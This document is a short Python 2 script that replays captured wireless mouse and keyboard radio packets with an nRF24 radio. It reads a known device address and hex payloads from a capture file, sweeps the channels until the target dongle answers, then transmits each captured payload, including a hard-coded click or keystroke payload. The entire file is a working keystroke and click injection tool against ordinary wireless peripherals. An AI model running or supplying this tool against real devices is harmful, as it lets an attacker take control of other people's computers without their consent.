#!/usr/bin/env python
'''
Code to replay wireless mouse and keyboard packets.
Assumes the the channel doesn't change
'''
import binascii, time, logging
from lib import common

# Parse command line arguments and initialize the radio
common.init_args('./nrf24-network-mapper.py')
common.parser.add_argument('-a', '--address', type=str, help='Known address', required=True)
common.parser.add_argument('-t', '--timeout', type=float, help='Channel timeout, in milliseconds', default=100)
common.parser.add_argument('-k', '--ack_timeout', type=int, help='ACK timeout in microseconds, accepts [250,4000], step 250', default=500)
common.parser.add_argument('-r', '--retries', type=int, help='Auto retry limit, accepts [0,15]', default='5', choices=xrange(0, 16), metavar='RETRIES')
common.parse_and_init()

# Parse the address
address = common.args.address.replace(':', '').decode('hex')[::-1][:5]
address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
if len(address) < 2: 
  raise Exception('Invalid address: {0}'.format(common.args.address))

# Put the radio in sniffer mode (ESB w/o auto ACKs)
common.radio.enter_sniffer_mode(address)

# Convert channel timeout from milliseconds to seconds
timeout = float(common.args.timeout) / float(1000)

# Format the ACK timeout and auto retry values 
ack_timeout = int(common.args.ack_timeout / 250) - 1
ack_timeout = max(0, min(ack_timeout, 15))
retries = max(0, min(common.args.retries, 15))
ping_payload = '\x0F\x0F\x0F\x0F'
#click_payload ='\x01\x02\x00\x00\x03\x38'
click_payload = '\x00\xc2\x00\x00\x00\x00\x00\x00\x00>'

#Read pack
def ReadCapture():
  payload = []
  for line in  open('capture.log'):
    payload.append(line)    
  return payload

def replay(sendpayload,data):
  #common.radio.set_channel(common.channels[channel_index])
  # Attempt to ping the address
  if common.radio.transmit_payload(sendpayload, ack_timeout, retries):
    #valid_addresses.append(try_address)
    print 'Sending Payload:'+' '+data

# Sweep through the channels and transmit on the active one
payloads = ReadCapture()

while True:
  for channel_index in range(len(common.channels)):
    common.radio.set_channel(common.channels[channel_index])

    while common.radio.transmit_payload(ping_payload, ack_timeout, retries):
      data = payloads[0].strip('\n')
      payload = binascii.a2b_hex(data.replace(':',''))
      replay(payload,data)
      del payloads[0]



